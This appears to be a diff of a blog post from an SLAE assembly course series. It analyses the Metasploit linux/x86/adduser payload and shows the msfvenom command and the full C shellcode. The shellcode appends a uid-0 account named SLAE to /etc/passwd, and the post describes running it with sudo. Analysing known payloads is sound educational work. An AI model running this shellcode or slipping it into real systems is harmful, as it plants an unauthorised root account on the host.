@@ -7,35 +7,22 @@ categories: [SLAE, Assembly]
 The 2nd metasploit payload we will analyze will be linux/x86/adduser.
 
 Time to set up the payload options and output the shellcode with msfvenom.
-
+```c
 msfvenom -p linux/x86/adduser PASS=SLAE USER=SLAE SHELL=/bin/sh -f c
-
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-
 [-] No arch selected, selecting arch: x86 from the payload
-
 No encoder or badchars specified, outputting raw payload
-
 Payload size: 91 bytes
-
 Final size of c file: 409 bytes
-
 unsigned char buf[] = 
-
 "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
-
 "\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
-
 "\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x53\x4c"
-
 "\x41\x45\x3a\x41\x7a\x72\x63\x6e\x7a\x50\x59\x6c\x66\x72\x32"
-
 "\x45\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
-
 "\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
-
 "\x80";
-
+```
 Time to make sure it works.  Place shellcode in the c wrapper, compile with proper flags, then run this with elevated permissions.  Since we are editing /etc/passwd, this will need to be run with sudo OR change permissions to your /etc/passwd file then revert after testing.  Steps for the c wrapper and compiler flags can be found in my first two SLAE posts - Shell Bind TCP and Shell Reverse TCP.
 ```
 sudo ./shellcode2
